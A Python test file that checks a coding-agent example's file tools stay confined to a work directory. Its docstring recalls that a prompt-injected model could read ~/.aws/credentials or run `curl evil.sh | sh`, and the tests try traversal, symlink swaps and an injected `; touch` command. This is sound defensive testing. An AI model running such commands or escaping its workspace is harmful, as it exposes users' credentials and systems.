"""Security contract for the coding-agent example's file tools (HIGH-001..003).

The example's read_file / edit_file / run_tests are the first thing an author
copies. The opus security review found the original versions let a
prompt-injected or adversarial model read ~/.aws/credentials, overwrite
~/.zshrc, or run `curl evil.sh | sh`. These tests pin the hardened contract:

- All filesystem access is confined to YAAH_CODING_AGENT_WORKDIR.
- The tools REFUSE to run if that env var is unset (no scary CWD default).
- Path traversal (../), absolute escapes, and symlink-escape are rejected.
- A symlink swapped in AT the target (the TOCTOU the eval demonstrated) is
  refused at open time via O_NOFOLLOW.
- run_tests uses shell=False with a fixed argv — no arbitrary-command surface.
- NUL bytes are rejected, not propagated as ValueError.

These are unit tests against the tool functions directly (the pipeline-level
smoke is test_coding_agent_example.py).

Run: cd yaah && python3 scripts/run_tests.py
"""
from __future__ import annotations

import importlib.util
import os
import sys
import tempfile

REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TOOLS_PATH = os.path.join(REPO_ROOT, "examples", "coding-agent", "tools.py")


def _load_tools():
    # Load the example's tools.py as a module (it's not on the package path).
    spec = importlib.util.spec_from_file_location("coding_agent_tools", TOOLS_PATH)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def _with_workdir(fn):
    """Run fn(tools, workdir) inside a tmp workdir with the env var set, then
    restore the env."""
    tools = _load_tools()
    prev = os.environ.get("YAAH_CODING_AGENT_WORKDIR")
    with tempfile.TemporaryDirectory() as wd:
        wd_real = os.path.realpath(wd)
        os.environ["YAAH_CODING_AGENT_WORKDIR"] = wd_real
        try:
            fn(tools, wd_real)
        finally:
            if prev is None:
                os.environ.pop("YAAH_CODING_AGENT_WORKDIR", None)
            else:
                os.environ["YAAH_CODING_AGENT_WORKDIR"] = prev


def test_read_file_refuses_without_workdir_env():
    tools = _load_tools()
    prev = os.environ.pop("YAAH_CODING_AGENT_WORKDIR", None)
    try:
        out = tools.read_file({"path": "anything.txt"})
        assert isinstance(out, str) and out.startswith("error:"), out
        assert "WORKDIR" in out or "work directory" in out.lower(), out
    finally:
        if prev is not None:
            os.environ["YAAH_CODING_AGENT_WORKDIR"] = prev


def test_read_file_reads_inside_workdir():
    def check(tools, wd):
        p = os.path.join(wd, "hello.txt")
        with open(p, "w") as f:
            f.write("inside")
        assert tools.read_file({"path": "hello.txt"}) == "inside"
        assert tools.read_file({"path": p}) == "inside"            # absolute, inside
    _with_workdir(check)


def test_read_file_rejects_parent_traversal():
    def check(tools, wd):
        # a secret one level above the workdir
        secret = os.path.join(os.path.dirname(wd), "secret.txt")
        with open(secret, "w") as f:
            f.write("TOPSECRET")
        try:
            out = tools.read_file({"path": "../secret.txt"})
            assert out.startswith("error:"), out
            assert "TOPSECRET" not in out, "traversal leaked the secret!"
        finally:
            os.unlink(secret)
    _with_workdir(check)


def test_read_file_rejects_absolute_escape():
    def check(tools, wd):
        out = tools.read_file({"path": "/etc/hosts"})
        assert out.startswith("error:"), out
        assert "outside" in out.lower() or "work" in out.lower(), out
    _with_workdir(check)


def test_read_file_refuses_symlink_target_swap():
    # The TOCTOU the eval demonstrated: a symlink AT an in-workdir name pointing
    # outside must not be followed. O_NOFOLLOW refuses it at open time.
    def check(tools, wd):
        outside = os.path.join(os.path.dirname(wd), "outside_secret.txt")
        with open(outside, "w") as f:
            f.write("SECRET")
        link = os.path.join(wd, "innocent.txt")
        os.symlink(outside, link)
        try:
            out = tools.read_file({"path": "innocent.txt"})
            assert out.startswith("error:"), out
            assert "SECRET" not in out, "symlink escape leaked the secret!"
        finally:
            os.unlink(link)
            os.unlink(outside)
    _with_workdir(check)


def test_read_file_rejects_nul_byte():
    def check(tools, wd):
        out = tools.read_file({"path": "a\x00b.txt"})
        assert out.startswith("error:"), out
    _with_workdir(check)


def test_edit_file_confined_and_edits_inside():
    def check(tools, wd):
        p = os.path.join(wd, "code.py")
        with open(p, "w") as f:
            f.write("x = 1 or 2\n")
        ok = tools.edit_file({"path": "code.py", "old_string": "1 or 2",
                              "new_string": "1 and 2"})
        assert ok.startswith("ok:"), ok
        with open(p) as f:
            assert f.read() == "x = 1 and 2\n"
    _with_workdir(check)


def test_edit_file_rejects_outside_escape():
    def check(tools, wd):
        target = os.path.join(os.path.dirname(wd), "victim.txt")
        with open(target, "w") as f:
            f.write("original")
        try:
            out = tools.edit_file({"path": "../victim.txt", "old_string": "original",
                                   "new_string": "pwned"})
            assert out.startswith("error:"), out
            with open(target) as f:
                assert f.read() == "original", "edit_file escaped the workdir!"
        finally:
            os.unlink(target)
    _with_workdir(check)


def test_run_tests_uses_no_shell_and_is_confined():
    def check(tools, wd):
        # a trivial passing test file inside the workdir
        tp = os.path.join(wd, "t_pass.py")
        with open(tp, "w") as f:
            f.write("import sys; sys.exit(0)\n")
        res = tools.run_tests({"test": "t_pass.py"})
        assert isinstance(res, dict), res
        assert res.get("exit_code") == 0, res
        # a shell-injection attempt in the test name must NOT execute a shell;
        # it's just a (missing) path -> error, not command execution.
        marker = os.path.join(wd, "PWNED")
        res2 = tools.run_tests({"test": "t_pass.py; touch " + marker})
        assert not os.path.exists(marker), "run_tests executed a shell command!"
    _with_workdir(check)


def test_run_tests_refuses_outside_workdir():
    def check(tools, wd):
        res = tools.run_tests({"test": "/etc/hosts"})
        assert isinstance(res, dict) and "error" in res, res
    _with_workdir(check)


if __name__ == "__main__":
    test_read_file_refuses_without_workdir_env()
    test_read_file_reads_inside_workdir()
    test_read_file_rejects_parent_traversal()
    test_read_file_rejects_absolute_escape()
    test_read_file_refuses_symlink_target_swap()
    test_read_file_rejects_nul_byte()
    test_edit_file_confined_and_edits_inside()
    test_edit_file_rejects_outside_escape()
    test_run_tests_uses_no_shell_and_is_confined()
    test_run_tests_refuses_outside_workdir()
    print("OK")
